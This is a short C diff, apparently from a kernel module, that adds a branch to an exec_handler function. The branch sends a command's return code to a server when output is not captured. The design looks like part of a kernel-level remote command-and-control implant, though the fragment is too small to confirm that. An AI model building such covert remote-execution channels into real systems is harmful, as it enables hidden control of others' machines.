@@ -277,6 +277,12 @@ static int exec_handler(char *args, enum Protocol protocol) {
         kfree(stdout_buff);
         kfree(stderr_buff);
     }
+    else {
+        // If not catching stds, just send the return code
+        char ret_code_msg[32] = { 0 };
+        snprintf(ret_code_msg, sizeof(ret_code_msg), "Terminated with code: %d\n", ret_code);
+        send_to_server(protocol, ret_code_msg);
+    }
 
     return ret_code;
 }
